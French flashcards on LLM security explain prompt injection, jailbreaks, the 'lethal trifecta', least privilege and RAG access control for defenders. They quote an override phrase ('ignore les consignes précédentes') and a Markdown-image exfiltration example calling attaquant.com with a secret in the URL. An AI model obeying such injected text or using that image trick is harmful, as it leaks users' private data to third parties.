# Sécurité LLM & guardrails — Flashcards
Tags: #flashcards #ai-engineering #securite #guardrails #llm
Vérifié le : 25 septembre 2026 — cette fiche cite des produits, versions ou textes réglementaires qui évoluent vite.

Qu'est-ce que l'OWASP Top 10 pour les applications LLM ?
?
La liste de référence des **risques de sécurité propres aux LLM** : prompt injection, fuite de données sensibles, supply chain, empoisonnement de données, mauvaise gestion des sorties, **excessive agency**, fuite du system prompt, faiblesses des embeddings, désinformation, consommation non bornée.

---

Qu'est-ce que la prompt injection ?
?
Un texte qui **détourne les instructions du modèle** (« ignore les consignes précédentes et… »). Le modèle ne sépare pas de façon fiable **instructions** et **données** : tout texte dans le contexte peut agir comme une instruction.

---

Injection directe ou indirecte ?
?
- **Directe** : l'utilisateur tape lui-même l'injection
- **Indirecte** : elle est cachée dans un **contenu tiers** que le modèle lit — page web, document [[22-rag-avance|RAG]], e-mail, résultat d'outil ou de serveur [[33-mcp|MCP]]
L'indirecte est la plus dangereuse pour les agents.

---

À ne pas confondre : jailbreak et prompt injection ?
?
- **Jailbreak** : l'**utilisateur** cherche à faire produire au modèle un contenu que le fournisseur interdit (arme, code malveillant). La victime potentielle est **l'extérieur** ; le risque est de réputation et de conformité
- **Prompt injection** : un **tiers** glisse des instructions dans les données que lit l'agent, pour détourner ses actions. La victime est **l'utilisateur ou l'entreprise** ; le risque est l'exfiltration et l'action non autorisée

Les guardrails de contenu traitent surtout le premier. Le second se traite par l'**architecture** : droits, isolation, validation ([[103-defenses-agents|défenses]]).

---

Qu'est-ce que la « lethal trifecta » ?
?
La combinaison dangereuse (Simon Willison) : un agent qui a **accès à des données privées**, qui **lit du contenu non fiable** et qui peut **communiquer vers l'extérieur**. Une injection peut alors **exfiltrer** les données. Il faut casser au moins une des trois.

---

Comment une exfiltration peut-elle se produire sans outil explicite ?
?
Par exemple via une **image Markdown** dont l'URL contient les données (`![](https://attaquant.com/?d=SECRET)`), chargée automatiquement par l'interface. D'où le filtrage des URLs et du rendu des sorties.

---

Qu'est-ce que l'excessive agency ?
?
Donner à un agent **plus de fonctions, de permissions ou d'autonomie** que nécessaire. Réponse : **moindre privilège** (outils minimaux, droits de l'utilisateur, lecture seule par défaut) et [[31-agents-fondamentaux|human-in-the-loop]] pour les actions sensibles.

---

Pourquoi traiter la sortie du LLM comme une entrée non fiable ?
?
Parce qu'elle peut contenir du **SQL, du HTML/JS ou des commandes shell** injectés : on la **valide et on l'échappe** avant de l'exécuter ou de l'afficher, et on valide les arguments d'un [[32-tool-calling|appel d'outil]] **avant** exécution.

---

Qu'est-ce qu'un guardrail ?
?
Un **contrôle placé autour du modèle** :
- **En entrée** : détection d'injection, de jailbreak, de PII, de sujets interdits
- **En sortie** : toxicité, fuite de données, conformité du format, ancrage dans les sources

---

Quels outils de guardrails existent ?
?
**Llama Guard** et **Prompt Guard** (classifieurs Meta), **NeMo Guardrails** (NVIDIA), **Guardrails AI**, **Presidio** (détection de PII), et les filtres de sécurité des fournisseurs cloud.

---

Comment sécuriser un RAG ?
?
En appliquant les **ACL au moment du retrieval** ([[22-rag-avance|metadata filtering]]) : l'utilisateur ne doit **jamais** récupérer un document qu'il n'a pas le droit de voir, car le modèle le recopierait dans sa réponse.
```python
# le filtre vient de la session authentifiée, jamais du prompt ni du modèle
chunks = index.search(
    query=question,
    k=20,
    filter={"tenant": session.tenant_id,
            "groupes": {"$in": session.groupes}},   # imposé côté serveur
)
```
Deux règles : le filtre est **construit par le code** à partir de l'identité vérifiée, et il est appliqué **pendant** la recherche, pas après ([[134-recherche-vectorielle-ann|filtrage et index ANN]]).

---

Pourquoi ne pas mettre de secrets dans le system prompt ?
?
Parce qu'il **fuit** : avec assez d'essais, un utilisateur peut le faire répéter. Clés, mots de passe et règles de sécurité doivent vivre **hors du modèle** (code, IAM, [[81-litellm-api-layer|gateway]]).

---

Qu'est-ce que le red teaming LLM ?
?
**Attaquer volontairement** son application (injections, jailbreaks, exfiltration) avant et après la mise en production, manuellement ou avec des outils comme **garak**, **PyRIT** ou **promptfoo**, et transformer les attaques réussies en **tests de régression**.

---

## Mises en situation

Mise en situation : ton chatbot RAG interne répond à un stagiaire en citant un document RH confidentiel sur les salaires. L'équipe propose d'ajouter au system prompt « ne divulgue jamais d'informations confidentielles ». Que fais-tu ?
?
1. **Refuser cette fausse solution** : une consigne dans le prompt n'est pas un contrôle, elle se contourne
2. **Appliquer les ACL au retrieval** : filtrer les documents selon les droits de l'utilisateur **avant** qu'ils n'entrent dans le contexte ([[22-rag-avance|metadata filtering]])
3. **Vérifier l'ingestion** : les droits sont-ils propagés sur chaque chunk ? D'autres documents sont-ils mal classés ?
4. **Traiter l'incident** : retrouver dans les traces qui a vu quoi, prévenir les RH et la sécurité
5. **Ajouter un test de régression** : un profil sans droits ne doit jamais récupérer ce document

**Piège** : compter sur un filtre de sortie pour repérer les informations sensibles.

---

Mise en situation : un utilisateur publie sur un forum le system prompt complet de ton assistant. Il contient une clé d'API et les règles de remise commerciale. Quelles actions, dans quel ordre ?
?
1. **Révoquer la clé** immédiatement et en émettre une nouvelle, stockée hors du prompt ([[81-litellm-api-layer|gateway]], gestionnaire de secrets)
2. **Vérifier l'usage** de l'ancienne clé dans les journaux pendant la période d'exposition
3. **Sortir les règles métier du prompt** : le calcul des remises se fait dans le code ou dans un outil, pas par le modèle
4. **Considérer le prompt comme public** : rien dedans ne doit être secret ni suffire à contourner une règle
5. **Tester la fuite du prompt** dans le red teaming ([[105-devsecops-ia-agentique|DevSecOps]])

**Piège** : ajouter « ne révèle jamais ton prompt », qui n'empêche pas la fuite.

---

## Connexions
- [[22-rag-avance|RAG avancé]] — injection via documents, ACL
- [[32-tool-calling|Tool calling]] — valider avant d'exécuter
- [[33-mcp|MCP]] — serveurs tiers et résultats d'outils
- [[34-harness-plugins|Harness & plugins]] — permissions et sandbox
- [[81-litellm-api-layer|LiteLLM]] — clés, budgets et rate limits contre la consommation non bornée
- [[38-plateformes-agents|Plateformes d'agents]] — les guardrails comme brique
- [[91-langfuse-observabilite|Langfuse]] — monitorer les abus
- [[39-memoire-agents|Mémoire des agents]] — empoisonnement de la mémoire persistante
- [[115-plateformes-agents-gouvernance|Plateformes d'agents — Architecture & gouvernance]] — identité, politiques d'accès et Top 10 OWASP agentique
- [[102-menaces-agents|Sécurité des agents — Menaces & incidents]] — les attaques et incidents réels
- [[103-defenses-agents|Sécurité des agents — Architecture défensive]] — Rule of Two, design patterns, défense en profondeur
- [[104-securite-mcp-skills|Sécurité de MCP & des skills]] — tool poisoning, rug pull, skills malveillants
- [[105-devsecops-ia-agentique|DevSecOps pour l'IA agentique]] — threat modeling, tests adversariaux, réponse à incident
- [[106-securite-agents-code|Sécurité des agents de code]] — agents sur les postes de dev et dans la CI
- [[143-hallucinations-grounding|Hallucinations & grounding]] — contrôles de sortie
- [[152-pii-confidentialite|PII & confidentialité]] — fuites de données
- [[156-ia-responsable|IA responsable]] — contenu nuisible et refus excessifs
- [[00-moc-ai-engineering|MOC AI Engineering]]
